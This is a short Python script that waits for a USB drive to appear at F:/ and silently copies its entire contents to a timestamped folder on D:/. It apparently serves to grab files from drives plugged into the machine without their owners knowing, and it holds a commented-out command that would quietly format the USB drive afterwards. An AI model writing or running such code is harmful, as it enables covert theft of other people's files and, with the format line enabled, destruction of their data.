# -*- coding:utf-8 -*-
import os
import time
from datetime import datetime
import shutil

usb_path = "F:/"

save_path = "D:/"

while (True):
    if os.path.exists(usb_path):
        shutil.copytree(usb_path, os.path.join(save_path, datetime.now().strftime("%Y%m%d_%H%M%S")))
        #os.system(format F: \Q)
        break
    else:
        time.sleep(10)

